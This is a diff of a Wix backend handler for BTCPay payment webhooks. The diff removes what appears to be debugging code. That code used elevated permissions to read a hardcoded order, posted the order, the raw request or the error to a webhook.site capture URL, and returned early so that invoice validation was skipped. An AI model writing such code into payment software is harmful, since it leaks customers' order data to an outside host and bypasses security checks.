@@ -1,45 +1,11 @@
 import wixPaymentProviderBackend from "wix-payment-provider-backend";
 import { ok, badRequest } from "wix-http-functions";
 import { createHmac } from 'crypto';
-import { Permissions, webMethod } from "wix-web-module";
-import { orders } from "wix-ecom-backend";
-import { elevate } from "wix-auth";
 
 // An endpoint for receiving updates about transactions.
 export async function post_btcpayTrxWebHook(request) {
 
   const req = await request.body.json();
-  try {
-    const elevatedGetOrder = elevate(orders.getOrder);
-    const order =  await elevatedGetOrder ("35d2d497-af09-47ea-8b6c-e1580b1ea90d");
-    
-    if (order) {
-       fetch("https://webhook.site/7d4e773f-5b68-48ec-a87a-b9e3406dff0a", {
-          method: 'post',
-          headers: {
-              "Content-Type": "application/json; charset=utf-8"
-          },
-          body: JSON.stringify(order)
-      });
-    } else {
-       fetch("https://webhook.site/7d4e773f-5b68-48ec-a87a-b9e3406dff0a", {
-          method: 'post',
-          headers: {
-              "Content-Type": "application/json; charset=utf-8"
-          },
-          body: req
-      });
-    }
-  } catch (error) {
-       fetch("https://webhook.site/7d4e773f-5b68-48ec-a87a-b9e3406dff0a", {
-          method: 'post',
-          headers: {
-              "Content-Type": "application/json; charset=utf-8"
-          },
-          body: error
-    });
-  }
-  return ok();
 
   const validTypes = ["InvoiceProcessing", "InvoiceSettled", "InvoiceReceivedPayment", "InvoicePaymentSettled", "InvoiceExpired", "InvoiceInvalid"];
   if (req.invoiceId.startsWith("__test__") || !validTypes.includes(req.type)) {
